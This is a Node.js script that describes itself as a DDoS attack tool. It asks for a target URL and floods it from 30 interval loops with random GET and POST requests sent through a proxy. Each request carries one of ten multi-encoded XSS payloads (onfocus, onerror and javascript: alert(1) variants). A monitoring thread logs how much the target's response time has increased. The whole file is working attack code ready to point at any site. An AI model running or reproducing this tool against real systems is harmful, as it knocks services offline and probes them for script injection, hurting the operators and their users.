const axios = require('axios');
const readline = require('readline');
const fs = require('fs');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const payloads = [
    'consultant%25252522%25252520onfocus%2525253Dalert(1)%25252522',
    'consultant%25252526quot%2525253B%25252520onmouseover%2525253D%25252526quot%2525253Balert(1)',
    'consultant%25252522%25252520onfocus%2525253Dalert(1)%25252500',
    'consultant%25252522%2525253Balert(1)%2525253B%25252522',
    'consultant%25252522%2525253E%2525253Cimg%25252520src%2525253Dx%25252520onerror%2525253D%25252522alert(1)%25252522%2525253E',
    'consultant%25252526lt%2525253Bscript%25252526gt%2525253Balert(1)',
    'consultant%25252522%2525253E%2525253Ca%25252520href%2525253Djavascript%2525253Aalert(1)%2525253EClick%25252520me%2525253C%2525252Fa%2525253E',
    'consultant%25252522%25252520style%2525253D%25252522width%2525253Aexpression%25252528alert(1)%25252529%25252522',
    'consultant%25252522%25252520onload%2525253Dalert(1)',
    'consultant%25252522%2525253Bonfocus%2525253Dalert(1)%25252522'
];

const numWorkers = 30;
const baseDelay = 5000; // 5 seconds delay between requests
const pingDelay = 3 * 1000 * 5; // 3 seconds per worker, total 15 seconds interval
let originalResponseTime = 0;
let requestCount = 0;

// Function to generate a random 4-character string
const generateRandomString = () => {
    return Math.random().toString(36).substring(2, 6); // Generates a random 4-character string
};

// Function to capture the response time of a URL
const captureResponseTime = async (url, proxy) => {
    const startTime = Date.now();
    try {
        await axios.get(url, {
            timeout: 10000, // 10 seconds timeout
            proxy,
            httpsAgent: new require('https').Agent({
                rejectUnauthorized: false
            })
        });
    } catch (error) {
        console.log(`Error capturing response time`);
    }
    return Date.now() - startTime;
};

// Function to send DDoS requests without waiting for responses
const sendDdosRequestWithoutWaiting = (url, proxy) => {
    const delay = baseDelay + Math.floor(Math.random() * 2000); // Add randomness to delay
    setTimeout(() => {
        axios({
            method: Math.random() > 0.5 ? 'get' : 'post', // Randomly choose between GET and POST
            url: url,
            timeout: 1000, // 1 second timeout to avoid long waits
            proxy,
            httpsAgent: new require('https').Agent({
                rejectUnauthorized: false
            })
        }).catch(() => { }); // Catch and ignore errors
        requestCount++;
    }, delay);
};

if (isMainThread) {
    rl.question('Please enter the base URL (e.g., https://example.com/Search.aspx?postback=true&more=false&jto=1&q=consultant): ', async (inputURL) => {
        const testURL = `${inputURL}`;
        console.log(`Starting DDoS attack on: ${testURL}`);

        // Capture the original response time using proxy on port 8080
        originalResponseTime = await captureResponseTime(testURL, { host: '192.168.189.131', port: 8080 });
        console.log(`Original response time: ${originalResponseTime} ms`);
        fs.appendFileSync('ddos_report.log', `Original response time: ${originalResponseTime} ms\n`);

        // Start Monitoring Worker
        const worker = new Worker(__filename, { workerData: { testURL, originalResponseTime } });
        worker.on('message', (msg) => {
            console.log(msg);
            fs.appendFileSync('ddos_report.log', `${msg}\n`);
        });

        // Start Sending DDoS Requests
        for (let i = 0; i < numWorkers; i++) {
            setInterval(() => {
                const payload = payloads[Math.floor(Math.random() * payloads.length)];
                sendDdosRequestWithoutWaiting(`${testURL}${payload}`, { host: '192.168.189.131', port: 8080 });
            }, baseDelay);
        }

        console.log('DDoS attack initiated. Monitoring target accessibility...');
        fs.appendFileSync('ddos_report.log', `DDoS attack initiated on: ${testURL}\n`);
        fs.appendFileSync('ddos_report.log', 'Monitoring target accessibility...\n');

        // Send request count to worker
        setInterval(() => {
            worker.postMessage(requestCount);
        }, 5000); // Send request count every 5 seconds

        rl.close();
    });
} else {
    const { testURL, originalResponseTime } = workerData;
    parentPort.on('message', (msg) => {
        requestCount = msg;
    });
    setInterval(async () => {
        const extraPayload = generateRandomString();
        const currentResponseTime = await captureResponseTime(`${testURL}&extra=${extraPayload}`, { host: '192.168.189.131', port: 8082 }); // Use proxy on port 8082 for ping requests
        const percentageDifference = ((currentResponseTime - originalResponseTime) / originalResponseTime) * 100;
        parentPort.postMessage(`Request count: ${requestCount}, Ping time: ${currentResponseTime} ms, Response time increase: ${percentageDifference.toFixed(2)}%`);
    }, pingDelay); // Check target every 15 seconds
}
